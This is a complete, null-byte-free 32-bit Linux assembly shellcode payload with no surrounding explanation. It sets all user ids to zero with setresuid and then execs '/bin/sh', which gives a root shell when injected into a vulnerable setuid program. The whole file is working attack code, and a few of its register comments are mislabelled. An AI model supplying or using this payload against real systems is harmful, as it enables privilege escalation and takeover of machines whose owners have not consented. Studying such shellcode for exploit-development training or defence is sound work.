BITS 32

; execve('/bin/sh',argv,envp)
; setresuid(ruid,euid,suid)

; setuid syscall
; syscall number
xor eax,eax
mov al,0xa4
; euid=0
xor ebx,ebx
; ruid=0
xor ecx,ecx
; suid=0
xor edx,edx
int 0x80

; execve syscall
; syscall number
xor eax,eax
; pushing null bytes to finish the string
push eax
mov al, 0xb
; '/bin/sh'
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
; argv=NULL
xor ecx, ecx
; envp=NULL
xor edx, edx
int 0x80

